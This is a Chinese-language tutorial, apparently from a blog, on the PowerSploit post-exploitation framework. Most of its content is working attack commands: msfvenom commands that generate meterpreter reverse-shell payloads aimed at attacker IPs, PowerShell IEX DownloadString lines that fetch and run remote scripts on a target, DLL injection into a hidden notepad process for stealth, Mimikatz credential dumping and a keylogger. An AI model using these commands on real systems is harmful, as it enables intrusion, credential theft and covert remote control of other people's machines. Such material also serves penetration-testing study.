## PowerSploit

PowerSploit是一款基于PowerShell的后渗透框架软件，包含很多PowerShell攻击脚本，

主要用于渗透中的信息侦察，权限提升，权限维持。

Github地址：`https://github.com/PowerShellMafia/PowerSploit1`

PowerSploit在kali下的搭建：

1 .下载PowerSploit到本地:

`git clone https://github.com/PowerShellMafia/PowerSploit`   //下载PowerSploit到本地。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5ppzi4tjwj30ng03i40h.jpg)

2. 开启kali的Apache服务。

   在kali终端输入:service apache2 start   //开启apache 服务。

   

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5pq5d3yw9j30cc00omx6.jpg)

3. 把下载好的文件夹移动到var/www/html目录，

   ![1565056847616](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1565056847616.png)



4.打开kali的浏览器访问：http://ip/PowerSploit  如：http://192.168.0.110/PowerSploit/

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5pqchs22qj30ng0mmq5p.jpg)

## [Powersploit](https://www.secpulse.com/archives/tag/powersploit)模块简介

\* CodeExecution 在目标主机执行代码

\* ScriptModification 在目标主机上创建或修改脚本

\* Persistence 后门脚本（持久性控制）

\* AntivirusBypass 发现杀软查杀特征

\* Exfiltration 目标主机上的信息搜集工具

\* Mayhem 蓝屏等破坏性脚本

\* Recon 以目标主机为跳板进行内网信息侦查



## PowerSploit  模块运用

### 1.Invoke-Shellcode 

CodeExexcution模块下的lnkvoke -shellcode （外壳代码）脚本常用于将ShellCode插入到指定的进程ID或本地PowerShell中。

先在目标主机安装“Invoke-Shellcode”脚本，使用Get-Help + 脚本名可以查看使用方法：

命令格式：

IEX (New-Object Net.WebClient).DownloadString("http://IP Adress/CodeExecutio

n/Invoke--Shellcode.ps1") 





例如：

 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.15.62 LPORT=5555 -f powershell -o /var/www/html/ttyu8888  #kali上生成powershell'

IEX(New-Object Net.Webclient).DownloadString("http://172.16.15.62/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")   #下载攻击模块

 IEX(New-Object Net.Webclient).DownloadString("http://172.16.15.62/ttyu8888")   #下载powershell攻击语句到本地。

Invoke-Shellcode -Shellcode $buf -Force  #在powershell中调用invoke-shellcode 

### 执行ShellCode 反弹Meterpreter Shell 

一：在MSF里面使用reverse_https模块进行反弹，设置如下

本来在Invoke-Shellcode直接使用以下这条命令进行反弹的：

`Invoke-Shellcode -Payload windows/meterpreter/reverse_https –Lhost 192.168.146.129 -Lport 4444 -Force`

但是Powersploit更新到了3.0, Invoke-Shellcode脚本没有Lhost和Lport参数，所以我们需要用到另外一种方法实现。

使用msfvenom生成一个powershell脚本。

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.110.129 LPORT=4444 -f powershell -o /var/www/html/test`



进程注入ShellCode反弹Meterpreter Shell

### 2.lnvoke-Dllinjection  DLL注入

使用Code Execution 模块下的Invoke-DLLInjection  为DLL注入脚本。

1. 首先下载安装DLL注入脚本到目标机器

   `IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.110/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")`			//下载指定路径的脚本。

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q16nerlvj30m901gglg.jpg)

2. 在MSF里面生成一个DLL注入脚本,然后下载DLL文件使用Invoke-DLLInjection脚本来实现DLL注入

   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f dll –o /var/www/html/shell2.dll`			//在kali下生成一个Dll注入脚本。![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q13wdiwij30s804haea.jpg)

   

3. 把生成的Dll上传到目标服务器的C盘，为什么使我们的注入更加隐蔽，我们开启一个隐藏进程来进行DLL注入。

   

   `Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden`		

   ​	//创建一个隐藏进程

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q15yk1mhj30k30euwf9.jpg)

   4.使用命令来进行进程注入。

   `Invoke-DllInjection -ProcessID 4080 -Dll c:\shell2.dll`  				//把dll的进程注入到notepad.exe中。

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q10x7ljnj30ix02xq2s.jpg)

   5.msf拿到反弹连接内容。

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q19ukqmqj30ks05xwho.jpg)

3.Invoke-Portscan 端口扫描

lnvoke-Portscan是Recon模块下的一个脚本，主要作用于端口扫描，使用起来也比简单。

1.先下载脚本。

下载格式为：`IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.110/PowerSploit/Recon/Invoke-Portscan.ps1")`            //下载扫描脚本

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q1jmznvhj30o30190sk.jpg)

2.设置扫描目标和端口

Invoke-Portscan -Hosts <IP Adress/Rangr> -Ports

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q1kbprnej30ma09bglt.jpg)

### 4.lnvoke-Mimikatz

### lnvoke-Mimikatz是Exfiltration模块下的一个脚本，它的功能获取管理员密码。

下载脚本：`IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.110/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1")`

![1565080994592](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1565080994592.png)

使用`Invoke-Mimikatz –DumpCreds`也可以直接运行

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q202au9sj30i00hx3z3.jpg)

### 5.Get -Keystrokes

Get-Keystrokes 键盘记录器

Get-Keystrokes -LogPath + <保存位置>

`IEX (New-Object Net.WebClient).DownloadString("http://192.168.0.110/PowerSploit/Exfiltration/Get-Keystrokes.ps1")`

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5q2eeunqkj30lb08hgm2.jpg)





